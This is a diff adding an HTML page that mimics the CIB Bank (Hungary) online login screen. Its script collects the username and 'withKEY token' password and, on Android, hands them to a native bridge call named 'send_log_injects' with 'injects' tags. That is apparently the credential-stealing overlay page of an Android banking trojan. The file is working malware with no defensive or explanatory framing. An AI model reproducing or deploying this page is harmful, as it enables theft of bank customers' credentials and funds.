@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <style>
+        form {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            padding: 15px;
+            text-align: center;
+        }
+        
+        section {
+            padding: 15px;
+            flex: 1;
+        }
+
+        .input {
+            width: 100%;
+            padding: 8px;
+            padding-left: 0;
+            border: 0;
+            border-bottom: 1px solid #b3b3b3;
+            margin-bottom: 20px;
+        }
+
+        .input:focus {
+            border-bottom: 2px solid #d9682d;
+        }
+
+        input, button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        .button {
+            width: 100%;
+            padding: 10px;
+            border: 0;
+            background-color: #262626;
+            color: #fff;
+        }
+
+        .button:disabled {
+            background-color: #e6e6e6;
+            color: #cccccc;
+        }
+    </style>
+</head>
+<body>
+    <form onsubmit="return false">
+        <header>
+            <img style="width: 22px;float: left;margin-top: 2px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADYAAAA2CAAAAACpLjUBAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2NDY0OCwgMjAyMS8wMS8xMi0xNTo1MjoyOSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIyLjIgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NENGNzdCMEM5NkZBMTFFQkE0RjlBRjlENEVCMTgyQ0EiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NENGNzdCMEQ5NkZBMTFFQkE0RjlBRjlENEVCMTgyQ0EiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo0Q0Y3N0IwQTk2RkExMUVCQTRGOUFGOUQ0RUIxODJDQSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo0Q0Y3N0IwQjk2RkExMUVCQTRGOUFGOUQ0RUIxODJDQSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PlBNZf4AAAITSURBVEjHvdZLTxpRFAdwPs1gCwjSii8a29T6SiqNz/oZlHbRtMZYXRc1KdEY3TjTpSZ1oVHuwrh141ZtE8NsmjDDCKaBjvKYMeWeC66Izt8Yz47FL8O955x7juv6XuF6aLYTCcdTMNsd9Hs62RXIdiNPJUlay2Jsb4Ar/5aJMIsNPKko71zSBliJRdxcfT0uAldSSLyTuJo5KQIJuGRDXHmmT0tA3kw2QmrqVwlId56Nkvr8uwxUSY6Nkfp0ZgHFlWPvufJ9TFpATebYOFf+D6oNlHJVBaIq0gFV1TSpIo2Tr6oJFem3f+I2ghNJpE1NcfNNzlSNXYnacPYPb1iRDdPNT6rIW1JODHLVGFWRJ8hm1CmeaNJ2EjWWoK6U+uPbTmL/3Ca2MdzAldTg9TmJxpdHxLoCEhTuOWIdPoxJU8SW+jDVfEAs8+MN/eyaXXES64c5cZNZpZuzZ1+OMw7iolRL97ncy4/6IpbCJo6h9JH7lsIGVbrmNGy+6XI/d+GYho1FrermNYhd6wq59gUdG8K6OF/rYhqb3brIQ+i7gY38tNLD3fO4gTyvPH9UZ4HltA0tGBn5NT0PK7oN7SUX8ityq5oFrTN/lU7hUha0BeWV8N2uzsg35TZya7e4egtGQWlxi+/Z0M5lKSHhDHBVk8kF94rgqrYe4udbMtDFUG6pPLibJsrKP992LPx5tKX31vgPLBKKxETX9UsAAAAASUVORK5CYII=" alt="">
+        
+            <span style="margin-left: -22px;font-weight: 600;"> CIB Bank Online belépés </span>
+        </header>
+        <section>
+            <input type="text" class="input" id="login" name="login" placeholder="Felhasználónév" autocomplete="off">
+            <input type="password" class="input" id="password" name="password" placeholder="withKEY token jelszó" autocomplete="off">
+        
+            <p style="text-align: center;font-size: 14px;margin: 0;"><u> CIB Internet Bank </u></p>
+            <p style="text-align: center;font-size: 14px;margin: 0;"><u> eBroker </u></p>
+            <p style="text-align: center;font-size: 14px;margin: 0;"><u> Biztonságos bankolás </u></p>
+        </section>
+        <footer>
+            <input type="submit" class="button" id="sendData" disabled value="BELÉPÉS">
+        </footer>
+    </form>
+    <script>
+        var login = document.getElementById('login'),
+            password = document.getElementById('password');
+
+        var sendData = document.getElementById('sendData');
+
+        function check() {
+            if(login.value.length >= 4 && password.value.length >= 4) {
+                sendData.disabled = false;
+            } else {
+                sendData.disabled = true;
+            }
+        }
+
+        login.onkeyup = () => {
+            check();
+        }
+
+        password.onkeyup = () => {
+            check();
+        }
+
+        sendData.onclick = () => {
+            var data = {};
+            data.login = login.value;
+            data.password = password.value;
+            data.type_injects = "banks";
+            data.closed = "close_activity_injects";
+
+            var ua = navigator.userAgent.toLowerCase();
+            if(ua.indexOf("android") > -1) {
+                try {
+                    Android.send_log_injects(JSON.stringify(data))
+                } catch (err) {}
+            }else{
+                alert(JSON.stringify(data));
+            }
+        }
+    </script>
+</body>
+</html>
